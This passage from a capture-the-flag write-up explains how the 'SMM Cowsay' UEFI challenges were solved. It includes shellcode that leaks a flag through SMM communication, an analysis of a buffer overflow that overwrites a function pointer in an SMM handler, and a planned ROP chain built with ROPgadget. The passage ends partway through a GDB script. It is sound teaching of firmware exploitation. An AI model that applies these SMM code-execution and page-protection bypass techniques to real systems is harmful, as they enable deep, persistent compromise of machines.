figured out the real reason behind the “access denied” when working on the
challenge</em>.</p>
<p>In fact, looking at the code for <code>Binexec.efi</code> above, in the <code>Cowsay()</code> function
the <code>EFI_SMM_COMMUNICATE_HEADER</code> is actually allocated using the library
function <code>AllocateRuntimeZeroPool()</code>. We don’t have a nice pointer to this
function, but can allocate memory using either <code>BootServices->AllocatePool()</code> or
<code>BootServices->AllocatePages()</code> specifying the “type” of memory we want to
allocate. The <code>EFI_MEMORY_TYPE</code> we want is
<a href="https://github.com/tianocore/edk2/blob/0ecdcb6142037dd1cdd08660a2349960bcf0270a/BaseTools/Source/C/Include/Common/UefiMultiPhase.h#L25">the type <code>EfiRuntimeServicesData</code></a>, which will be
accessible from SMM.</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#DBD7CAEE">EfiRuntimeServicesData </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 6</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">code </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#666666">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">'''</span></span>
<span class="line"><span style="color:#C98A7D">    /* AllocatePool(EfiRuntimeServicesData, 0x1000, &#x26;buffer) */</span></span>
<span class="line"><span style="color:#C98A7D">    mov rcx, </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">EfiRuntimeServicesData</span><span style="color:#C99076">}</span></span>
<span class="line"><span style="color:#C98A7D">    mov rdx, 0x1000</span></span>
<span class="line"><span style="color:#C98A7D">    lea r8, qword ptr [rip + buffer]</span></span>
<span class="line"><span style="color:#C98A7D">    mov rax, </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">AllocatePool</span><span style="color:#C99076">}</span></span>
<span class="line"><span style="color:#C98A7D">    call rax</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">    test rax, rax</span></span>
<span class="line"><span style="color:#C98A7D">    jnz fail</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">    mov rax, qword ptr [rip + buffer]</span></span>
<span class="line"><span style="color:#C98A7D">    ret</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">fail:</span></span>
<span class="line"><span style="color:#C98A7D">    ud2</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">buffer:</span></span>
<span class="line"><span style="color:#C98A7D">'''</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">hex</span><span style="color:#666666">().</span><span style="color:#DBD7CAEE">encode</span><span style="color:#666666">()</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\n</span><span style="color:#C98A7D">done</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">RAX: 0x</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">buffer </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvn</span><span style="color:#666666">(</span><span style="color:#4C9A91">16</span><span style="color:#666666">),</span><span style="color:#4C9A91"> 16</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">success</span><span style="color:#666666">(</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">Allocated buffer @ 0x</span><span style="color:#C99076">%x</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> buffer</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">code </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> asm</span><span style="color:#666666">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">'''</span></span>
<span class="line"><span style="color:#C98A7D">    /* Copy data into allocated buffer */</span></span>
<span class="line"><span style="color:#C98A7D">    lea rsi, qword ptr [rip + data]</span></span>
<span class="line"><span style="color:#C98A7D">    mov rdi, </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">buffer</span><span style="color:#C99076">}</span></span>
<span class="line"><span style="color:#C98A7D">    mov rcx, 0x20</span></span>
<span class="line"><span style="color:#C98A7D">    cld</span></span>
<span class="line"><span style="color:#C98A7D">    rep movsb</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">    /* Communicate(mSmmCommunication, buffer, NULL) */</span></span>
<span class="line"><span style="color:#C98A7D">    mov rcx, </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">mSmmCommunication</span><span style="color:#C99076">}</span></span>
<span class="line"><span style="color:#C98A7D">    mov rdx, </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">buffer</span><span style="color:#C99076">}</span></span>
<span class="line"><span style="color:#C98A7D">    xor r8, r8</span></span>
<span class="line"><span style="color:#C98A7D">    mov rax, </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">Communicate</span><span style="color:#C99076">}</span></span>
<span class="line"><span style="color:#C98A7D">    call rax</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">    test rax, rax</span></span>
<span class="line"><span style="color:#C98A7D">    jnz fail</span></span>
<span class="line"><span style="color:#C98A7D">    ret</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">fail:</span></span>
<span class="line"><span style="color:#C98A7D">    ud2</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C98A7D">data:</span></span>
<span class="line"><span style="color:#C98A7D">    .octa </span><span style="color:#C99076">{</span><span style="color:#DBD7CAEE">gEfiSmmCowsayCommunicationGuid</span><span style="color:#C99076">}</span><span style="color:#C98A7D"> /* Buffer->HeaderGuid */</span></span>
<span class="line"><span style="color:#C98A7D">    .quad 8                                /* Buffer->MessageLength */</span></span>
<span class="line"><span style="color:#C98A7D">    .quad 0x44440000                       /* Buffer->Data */</span></span>
<span class="line"><span style="color:#C98A7D">'''</span><span style="color:#666666">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">code</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">hex</span><span style="color:#666666">().</span><span style="color:#DBD7CAEE">encode</span><span style="color:#666666">())</span></span>
<span class="line"><span style="color:#DBD7CAEE">conn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#666666">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">done</span><span style="color:#C98A7D77">'</span><span style="color:#666666">)</span></span>
<span class="line"></span></code></pre>
<p>Output:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Running...</span></span>
<span class="line"><span> __________________________</span></span>
<span class="line"><span>&#x3C; uut{hnrn_eoi_nufcet3201} --------------------------</span></span>
<span class="line"><span>          \   ^__^</span></span>
<span class="line"><span>           \  (oo)\_______</span></span>
<span class="line"><span>              (__)\       )\/\</span></span>
<span class="line"><span>                  ||----w |</span></span>
<span class="line"><span>                  ||     ||</span></span>
<span class="line"><span></span></span></code></pre>
<p>Remember that we are dealing with UTF16 strings? The print routine in
<code>SmmCowsay</code> seems to just skip half the characters for this reason. We can
simply print again passing <code>0x44440001</code> as pointer to get the second half of the
flag:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Running...</span></span>
<span class="line"><span> _________________________</span></span>
<span class="line"><span>&#x3C; icfwe_igzr_sisfiin_55e8 ></span></span>
<span class="line"><span> -------------------------</span></span>
<span class="line"><span>          \   ^__^</span></span>
<span class="line"><span>           \  (oo)\_______</span></span>
<span class="line"><span>              (__)\       )\/\</span></span>
<span class="line"><span>                  ||----w |</span></span>
<span class="line"><span>                  ||     ||</span></span>
<span class="line"><span></span></span></code></pre>
<p>Reassembling it gives us: <code>uiuctf{when_ring_zero_is_insufficient_35250e18}</code>.</p>
<hr>
<h1 id="smm-cowsay-2">SMM Cowsay 2</h1>
<p><strong>Full exploit</strong>: <a href="https://github.com/TowerofHanoi/towerofhanoi.github.io/blob/master/writeup_files/uiuctf-2022_smm-cowsay/expl_smm_cowasy_2.py">expl_smm_cowasy_2.py</a></p>
<blockquote>
<p>We asked that engineer to fix the issue, but I think he may have left a
backdoor disguised as debugging code.</p>
</blockquote>
<p>We are still in the exact same environment as before, but the code for the
<code>SmmCowsay.efi</code> driver was changed. Additionally, we no longer have global RWX
memory as the fifth EDK2 patch
(<code>0005-PiSmmCpuDxeSmm-Protect-flag-addresses.patch</code>) now does not unlock page
table entry permissions, but instead <em>explicitly sets the memory area containing
the flag as read-protected!</em></p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#80A665">  SmmSetMemoryAttributes</span><span style="color:#666666"> (</span></span>
<span class="line"><span style="color:#CB7676">    0x</span><span style="color:#4C9A91">44440000</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#80A665">    EFI_PAGES_TO_SIZE</span><span style="color:#666666">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">),</span></span>
<span class="line"><span style="color:#DBD7CAEE">    EFI_MEMORY_RP</span></span>
<span class="line"><span style="color:#666666">    );</span></span>
<span class="line"></span></code></pre>
<p>A hint is also given in the commit message:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>From: YiFei Zhu &#x3C;zhuyifei@google.com></span></span>
<span class="line"><span>Date: Mon, 28 Mar 2022 17:55:14 -0700</span></span>
<span class="line"><span>Subject: [PATCH 5/8] PiSmmCpuDxeSmm: Protect flag addresses</span></span>
<span class="line"><span></span></span>
<span class="line"><span>So attacker must disable paging or overwrite page table entries</span></span>
<span class="line"><span>(which would require disabling write protection in cr0... so, the</span></span>
<span class="line"><span>latter is redundant to former)</span></span>
<span class="line"><span></span></span></code></pre>
<p>The first thing the <a href="https://github.com/tianocore/edk2/blob/1774a44ad91d01294bace32b0060ce26da2f0140/UefiCpuPkg/PiSmmCpuDxeSmm/X64/SmiEntry.nasm#L89">EDK2 SMI handler</a> does is set up a 4-level
page table and enable 64-bit long mode, so SMM code runs in 64-bit mode with a
page table.</p>
<p>The virtual addresses stored in the page table correspond 1:1 to physical
addresses, so the page table itself is only used as a way to manage permissions
for different memory areas (for example, page table entries for pages that do
not contain code will have the NX bit set). The flag page (<code>0x44440000</code>) was
marked as “read-protect” which simply means that the corresponding page table
entry will have the present bit clear, and thus any access will result in a page
fault.</p>
<h2 id="vulnerability">Vulnerability</h2>
<p>Let’s look at the updated code for <code>SmmCowsay.efi</code>. How is the communication
handled now? We have a new <code>mDebugData</code> structure:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#CB7676">struct</span><span style="color:#666666"> {</span></span>
<span class="line"><span style="color:#DBD7CAEE">  CHAR16 </span><span style="color:#BD976A">Message</span><span style="color:#666666">[</span><span style="color:#4C9A91">200</span><span style="color:#666666">];</span></span>
<span class="line"><span style="color:#DBD7CAEE">  VOID </span><span style="color:#80A665">EFIAPI</span><span style="color:#666666"> (</span><span style="color:#CB7676">*</span><span style="color:#CB7676"> volatile</span><span style="color:#DBD7CAEE"> CowsayFunc</span><span style="color:#666666">)(</span><span style="color:#DBD7CAEE">IN CONST CHAR16 </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">Message</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> IN UINTN MessageLen</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#DBD7CAEE">  BOOLEAN </span><span style="color:#CB7676">volatile</span><span style="color:#DBD7CAEE"> Icebp</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#DBD7CAEE">  UINT64 </span><span style="color:#CB7676">volatile</span><span style="color:#DBD7CAEE"> Canary</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">}</span><span style="color:#DBD7CAEE"> mDebugData</span><span style="color:#666666">;</span></span>
<span class="line"></span></code></pre>
<p>This structure holds a <code>->CowsayFunc</code> function pointer, which is set when the
driver is initialized:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#DBD7CAEE">mDebugData.CowsayFunc </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> Cowsay</span><span style="color:#666666">;</span></span>
<span class="line"></span></code></pre>
<p>The SMM handler code uses the <code>mDebugData</code> structure as follows upon receiving a
message:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#DBD7CAEE">EFI_STATUS</span></span>
<span class="line"><span style="color:#DBD7CAEE">EFIAPI</span></span>
<span class="line"><span style="color:#80A665">SmmCowsayHandler</span><span style="color:#666666"> (</span></span>
<span class="line"><span style="color:#DBD7CAEE">  IN EFI_HANDLE  </span><span style="color:#BD976A">DispatchHandle</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#DBD7CAEE">  IN CONST VOID  </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">Context         </span><span style="color:#BD976A">OPTIONAL</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#DBD7CAEE">  IN OUT VOID    </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">CommBuffer      </span><span style="color:#BD976A">OPTIONAL</span><span style="color:#666666">,</span></span>
<span class="line"><span style="color:#DBD7CAEE">  IN OUT UINTN   </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">CommBufferSize  OPTIONAL</span></span>
<span class="line"><span style="color:#666666">  )</span></span>
<span class="line"><span style="color:#666666">{</span></span>
<span class="line"><span style="color:#DBD7CAEE">  EFI_STATUS Status</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#DBD7CAEE">  UINTN TempCommBufferSize</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#DBD7CAEE">  UINT64 Canary</span><span style="color:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#80A665">  DEBUG</span><span style="color:#666666"> ((</span><span style="color:#DBD7CAEE">DEBUG_INFO</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">SmmCowsay SmmCowsayHandler Enter</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">));</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">  if</span><span style="color:#666666"> (</span><span style="color:#CB7676">!</span><span style="color:#DBD7CAEE">CommBuffer </span><span style="color:#CB7676">||</span><span style="color:#CB7676"> !</span><span style="color:#DBD7CAEE">CommBufferSize</span><span style="color:#666666">)</span></span>
<span class="line"><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> EFI_SUCCESS</span><span style="color:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">  TempCommBufferSize </span><span style="color:#666666">=</span><span style="color:#CB7676"> *</span><span style="color:#DBD7CAEE">CommBufferSize</span><span style="color:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#758575DD">  // ... irrelevant code ...</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">  Status </span><span style="color:#666666">=</span><span style="color:#80A665"> SmmCopyMemToSmram</span><span style="color:#666666">(</span><span style="color:#BD976A">mDebugData</span><span style="color:#666666">.</span><span style="color:#BD976A">Message</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> CommBuffer</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> TempCommBufferSize</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">  if</span><span style="color:#666666"> (</span><span style="color:#80A665">EFI_ERROR</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">Status</span><span style="color:#666666">))</span></span>
<span class="line"><span style="color:#4D9375">    goto</span><span style="color:#DBD7CAEE"> out</span><span style="color:#666666">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#758575DD">  // ... irrelevant code ...</span></span>
<span class="line"></span>
<span class="line"><span style="color:#80A665">  SetMem</span><span style="color:#666666">(</span><span style="color:#BD976A">mDebugData</span><span style="color:#666666">.</span><span style="color:#BD976A">Message</span><span style="color:#666666">,</span><span style="color:#CB7676"> sizeof</span><span style="color:#666666">(</span><span style="color:#BD976A">mDebugData</span><span style="color:#666666">.</span><span style="color:#BD976A">Message</span><span style="color:#666666">),</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#BD976A">  mDebugData</span><span style="color:#666666">.</span><span style="color:#80A665">CowsayFunc</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">CommBuffer</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> TempCommBufferSize</span><span style="color:#666666">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">out:</span></span>
<span class="line"><span style="color:#80A665">  DEBUG</span><span style="color:#666666"> ((</span><span style="color:#DBD7CAEE">DEBUG_INFO</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">SmmCowsay SmmCowsayHandler Exit</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">));</span></span>
<span class="line"></span>
<span class="line"><span style="color:#4D9375">  return</span><span style="color:#DBD7CAEE"> EFI_SUCCESS</span><span style="color:#666666">;</span></span>
<span class="line"><span style="color:#666666">}</span></span>
<span class="line"></span></code></pre>
<p>The problem is clear as day:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#DBD7CAEE">  Status </span><span style="color:#666666">=</span><span style="color:#80A665"> SmmCopyMemToSmram</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">mDebugData.Message</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> CommBuffer</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> TempCommBufferSize</span><span style="color:#666666">);</span></span>
<span class="line"><span style="color:#4D9375">  if</span><span style="color:#666666"> (</span><span style="color:#80A665">EFI_ERROR</span><span style="color:#666666">(</span><span style="color:#DBD7CAEE">Status</span><span style="color:#666666">))</span></span>
<span class="line"><span style="color:#4D9375">    goto</span><span style="color:#DBD7CAEE"> out</span><span style="color:#666666">;</span></span>
<span class="line"></span></code></pre>
<p>Here we have a memcpy-like function performing a copy from the <code>->Data</code> field of
the <code>EFI_SMM_COMMUNICATE_HEADER</code> (passed as <code>CommBuffer</code>) using the
<code>->MessageLength</code> field as size (passed as <code>CommBufferSize</code>). The size is
trusted and used as is, so any size above 400 will overflow the
<code>CHAR16 Message[200]</code> field of <code>mDebugData</code> and corrupt the <code>CowsayFunc</code>
function pointer, which is then called right away.</p>
<h2 id="exploitation-1">Exploitation</h2>
<p>The situation seems simple enough: send 400 bytes of garbage followed by an
address and get RIP control inside System Management Mode. Once we have RIP
control, we can build a ROP chain to either (A) disable paging altogether and
read the flag, or (B) disable <code>CR0.WP</code> (since the page table is read only) and
patch the page table entry for the flag to make it readable.</p>
<p>Method A was the author’s solution. In fact there already is
<a href="https://github.com/tianocore/edk2/blob/2812668bfc121ee792cf3302195176ef4a2ad0bc/UefiCpuPkg/PiSmmCpuDxeSmm/X64/SmiException.nasm#L31">a nice segment descriptor</a> for 32-bit protected mode in the SMM GDT
that we could use for the code segment (<code>CS</code> register). However I went with
method (B) because it seemed more straightforward. <em>Ok, honestly speaking I
couldn’t be bothered with figuring out how to correctly do the mode switch in
terms of x86 assembly as I had never done it before, can you blame me? :’)</em></p>
<p>There is a bit of a problem in building a ROP chain though: after the <code>call</code> to
our address we lose control of the execution as we do not control the SMM stack.
It would be nice to simply overwrite the function pointer with the address of
our shellcode buffer and execute arbitrary code in SMM, but as we already saw
earlier, SMM cannot access that memory region, and this would just result in a
crash.</p>
<h3 id="finding-rop-gadgets">Finding ROP gadgets</h3>
<p><strong>What can we access then?</strong> It’s clear that we’ll need to ROP our way to
victory. We can modify the <code>run.sh</code> script provided to run the challenge locally
in QEMU to capture EDK2 debug messages and write them to a file (we have a
<code>handout/edk2debug.log</code> which was obtained in the same way from a sample run
when building the challenge, but it’s nice to have our own). Let’s add the
following arguments to the QEMU command line in <code>handout/run/run.sh</code>:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>-global isa-debugcon.iobase=0x402 -debugcon file:../../debug.log</span></span>
<span class="line"><span></span></span></code></pre>
<p>Now we can run the challenge and take a look at <code>debug.log</code>. Among the various
debug messages, EDK2 prints the base address and the entry point of every driver
it loads:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>$ cd handout/run; ./run.sh; cd -</span></span>
<span class="line"><span>$ cat debug.log | grep 'SMM driver'</span></span>
<span class="line"><span>Loading SMM driver at 0x00007FE3000 EntryPoint=0x00007FE526B CpuIo2Smm.efi</span></span>
<span class="line"><span>Loading SMM driver at 0x00007FD9000 EntryPoint=0x00007FDC6E4 SmmLockBox.efi</span></span>
<span class="line"><span>Loading SMM driver at 0x00007FBF000 EntryPoint=0x00007FCC159 PiSmmCpuDxeSmm.efi</span></span>
<span class="line"><span>Loading SMM driver at 0x00007F99000 EntryPoint=0x00007F9C851 FvbServicesSmm.efi</span></span>
<span class="line"><span>Loading SMM driver at 0x00007F83000 EntryPoint=0x00007F8BAD0 VariableSmm.efi</span></span>
<span class="line"><span>Loading SMM driver at 0x00007EE7000 EntryPoint=0x00007EE99E7 SmmCowsay.efi</span></span>
<span class="line"><span>Loading SMM driver at 0x00007EDF000 EntryPoint=0x00007EE2684 CpuHotplugSmm.efi</span></span>
<span class="line"><span>Loading SMM driver at 0x00007EDD000 EntryPoint=0x00007EE2A1E SmmFaultTolerantWriteDxe.efi</span></span>
<span class="line"><span></span></span></code></pre>
<p>Surely enough, the <code>.text</code> section of all these drivers will contain code we can
execute in SMM. What ROP gadgets do we have?
<a href="https://github.com/JonathanSalwan/ROPgadget">Let’s use <code>ROPGadget</code></a> to find them, using the base addresses
provided by the EDK2 debug log:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B8A965">cd</span><span style="color:#C98A7D"> handout/edk2_artifacts</span></span>
<span class="line"><span style="color:#80A665">ROPgadget</span><span style="color:#C99076"> --binary</span><span style="color:#C98A7D"> CpuIo2Smm.efi</span><span style="color:#C99076">  --offset</span><span style="color:#4C9A91"> 0x00007FE3000</span><span style="color:#CB7676"> >></span><span style="color:#C98A7D"> ../../gadgets.txt</span></span>
<span class="line"><span style="color:#80A665">ROPgadget</span><span style="color:#C99076"> --binary</span><span style="color:#C98A7D"> SmmLockBox.efi</span><span style="color:#C99076"> --offset</span><span style="color:#4C9A91"> 0x00007FD9000</span><span style="color:#CB7676"> >></span><span style="color:#C98A7D"> ../../gadgets.txt</span></span>
<span class="line"><span style="color:#758575DD"># ... and so on ...</span></span>
<span class="line"></span></code></pre>
<p>Even though we have a lot of gadgets, we need multiple ones to build a useful
ROP chain. After the <code>ret</code> from the first gadget, control will return back to
<code>SmmCowsayHandler</code> if we do not somehow move the stack (RSP) to a controlled
memory region, so the first gadget we need is one that is able to flip the stack
where we want.</p>
<p>There is <a href="https://github.com/tianocore/edk2/blob/1774a44ad91d01294bace32b0060ce26da2f0140/MdePkg/Library/BaseLib/X64/LongJump.nasm#L54"><em>a very nice gadget</em></a> in EDK2 code:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="c"><code><span class="line"><span style="color:#758575DD">// MdePkg/Library/BaseLib/X64/LongJump.nasm</span></span>
<span class="line"><span style="color:#DBD7CAEE">CetDone:</span></span>
<span class="line"></span>
<span class="line"><span style="color:#DBD7CAEE">    mov     rbx</span><span style="color:#666666">,</span><span style="color:#666666"> [</span><span style="color:#DBD7CAEE">rcx</span><span style="color:#666666">]</span></span>
<span class="line"><span style="color:#DBD7CAEE">    mov     rsp</span><span style="color:#666666">,</span><span style="color:#666666"> [</span><span style="color:#DBD7CAEE">rcx </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 8</span><span style="color:#666666">]</span></span>
<span class="line"><span style="color:#DBD7CAEE">    mov     rbp</span><span style="color:#666666">,</span><span style="color:#666666"> [</span><span style="color:#DBD7CAEE">rcx </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">10</span><span style="color:#666666">]</span></span>
<span class="line"><span style="color:#DBD7CAEE">    mov     rdi</span><span style="color:#666666">,</span><span style="color:#666666"> [</span><span style="color:#DBD7CAEE">rcx </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">18</span><span style="color:#666666">]</span></span>
<span class="line"><span style="color:#DBD7CAEE">    mov     rsi</span><span style="color:#666666">,</span><span style="color:#666666"> [</span><span style="color:#DBD7CAEE">rcx </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">20</span><span style="color:#666666">]</span></span>
<span class="line"><span style="color:#DBD7CAEE">    mov     r12</span><span style="color:#666666">,</span><span style="color:#666666"> [</span><span style="color:#DBD7CAEE">rcx </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">28</span><span style="color:#666666">]</span></span>
<span class="line"><span style="color:#DBD7CAEE">    mov     r13</span><span style="color:#666666">,</span><span style="color:#666666"> [</span><span style="color:#DBD7CAEE">rcx </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">30</span><span style="color:#666666">]</span></span>
<span class="line"><span style="color:#DBD7CAEE">    mov     r14</span><span style="color:#666666">,</span><span style="color:#666666"> [</span><span style="color:#DBD7CAEE">rcx </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">38</span><span style="color:#666666">]</span></span>
<span class="line"><span style="color:#DBD7CAEE">    mov     r15</span><span style="color:#666666">,</span><span style="color:#666666"> [</span><span style="color:#DBD7CAEE">rcx </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">40</span><span style="color:#666666">]</span></span>
<span class="line"><span style="color:#758575DD">// ...</span></span>
<span class="line"><span style="color:#DBD7CAEE">    jmp     qword </span><span style="color:#666666">[</span><span style="color:#DBD7CAEE">rcx </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">48</span><span style="color:#666666">]</span></span>
<span class="line"></span></code></pre>
<p>Our function pointer will be called with <code>CommBuffer</code> as first argument (RCX),
so jumping here would load a bunch of registers <strong>including RSP</strong> directly from
data we provide. This is very nice, and indeed the author’s solution uses this
to easily flip the stack and continue the ROP chain, but <code>ROPgadget</code> was not
smart enough to find it for me, and I did not notice it when skimming through
EDK2 source code while solving the challenge. <em>Too bad!</em> It would have
definitely saved me some time :’). I will avoid using it and show how I
originally solved the challenge to make things more interesting.</p>
<h3 id="flipping-the-stack-to-controlled-memory-for-a-rop-chain">Flipping the stack to controlled memory for a ROP chain</h3>
<p>In any case, we still have a nice trick up our sleeve. See, it’s true that we do
not control the SMM stack, but what if some of our registers got spilled on the
stack? With a gadget of the form <code>ret 0x123</code> or <code>add rsp, 0x123; ret</code> we would
be able to move the stack pointer forward and use anything that we control on
the SMM stack as another gadget. In order to check this we can attach a debugger
to QEMU and break at the call to <code>mDebugData.CowsayFunc()</code> in
<code>SmmCowsayHandler()</code>.</p>
<p>We can enable debugging in QEMU by simply adding <code>-s</code> to the command line, and
then attach to it from GDB. I wrote a simple Python GDB plugin to load debug
symbols from the <code>.debug</code> files we have to make our life easier:</p>
<pre class="astro-code vitesse-dark" style="background-color:#121212;color:#dbd7caee; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> gdb</span></span>
<span class="line"><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> os</span></span>
<span class="line"></span>
<span class="line"><span style="color:#CB7676">class</span><span style="color:#5DA994"> AddAllSymbols</span><span style="color:#666666">(</span><span style="color:#80A665">gdb</span><span style="color:#666666">.</span><span style="color:#80A665">Command</span><span style="color:#666666">):</span></span>
<span class="line"><span style="color:#CB7676">    def</span><span style="color:#B8A965"> __init__</span><span style="color:#666666"> (</span><span style="color:#DBD7CAEE">self</span><span style="color:#666666">):</span></span>
